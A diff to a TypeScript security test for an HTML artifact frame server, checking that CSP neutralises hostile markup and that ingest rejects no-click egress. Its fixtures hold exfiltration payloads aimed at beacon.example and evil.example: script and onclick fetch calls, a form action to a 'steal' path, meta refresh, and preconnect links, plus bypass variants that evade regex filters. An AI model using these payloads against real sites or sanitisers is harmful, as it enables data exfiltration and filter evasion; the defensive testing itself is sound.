@@ -27,7 +27,10 @@ afterAll(async () => {
   await server?.close();
 });
 
-// Every classic exfil / execution vector in one document.
+// The CSP-INERT vectors (they publish fine and are served verbatim; the header
+// CSP renders them harmless). The no-click network-egress vectors (<meta
+// http-equiv=refresh>, connection-hint <link>) are REJECTED at ingest instead —
+// see the ingest-rejection test below — so they are NOT in this served fixture.
 const HOSTILE_HTML =
   "<h1>Report</h1>" +
   '<img src="https://beacon.example/pixel.png" alt="x">' + // network img beacon
@@ -36,8 +39,11 @@ const HOSTILE_HTML =
   '<button onclick="fetch(\'https://beacon.example/click\')">click</button>' +
   "<script>fetch('https://beacon.example/script')</script>" +
   '<script nonce="attacker-guess">alert(1)</script>' +
-  '<meta http-equiv="refresh" content="0;url=https://refresh.example/go">' +
   "<p>end</p>";
+
+function isToolError(result: unknown): boolean {
+  return (result as { isError?: boolean }).isError === true;
+}
 
 async function publishHostile(): Promise<{ id: string; slug: string }> {
   const published = toolJson(
@@ -145,11 +151,29 @@ describe("html hatch — frame server", () => {
     expect(doc).toContain('action="https://beacon.example/steal"'); // form-action none blocks
     expect(doc).toContain('onclick="fetch'); // script-src nonce blocks inline handler
     expect(doc).toContain("fetch('https://beacon.example/script')"); // no nonce → blocked
-    // STRIPPED (CSP can't cover these): meta refresh + the model's nonce.
-    expect(doc).not.toContain("refresh.example");
-    expect(doc).not.toContain("http-equiv");
+    // The model's nonce is stripped on serve (belt-and-suspenders).
     expect(doc).not.toContain("attacker-guess");
     expect(doc).toContain("<script>alert(1)</script>"); // nonce stripped, still inert
+  });
+
+  test("ingest REJECTS no-click network egress (meta refresh + hint/external link)", async () => {
+    // A regex strip was bypassable, so these are rejected at publish — nothing
+    // is stored, and the tool returns an error the agent can act on.
+    const cases = [
+      '<meta http-equiv="refresh" content="0;url=https://refresh.example/go"><p>x</p>',
+      // Verified bypass payloads (quoted `>`, entity-encoded keyword).
+      '<meta name="x>" http-equiv="refresh" content="0;url=https://evil.example/"><p>x</p>',
+      '<meta http-equiv="&#82;efresh" content="0;url=https://evil.example/"><p>x</p>',
+      '<link rel="preconnect" href="https://evil.example"><p>x</p>',
+      '<link rel="dns-prefetch" href="//evil.example"><p>x</p>',
+    ];
+    for (const html of cases) {
+      const res = await server.client.callTool({
+        name: "publish_artifact",
+        arguments: { type: "html", title: "egress", html },
+      });
+      expect(isToolError(res)).toBe(true);
+    }
   });
 
   test("token canary: the served frame document never contains the token", async () => {
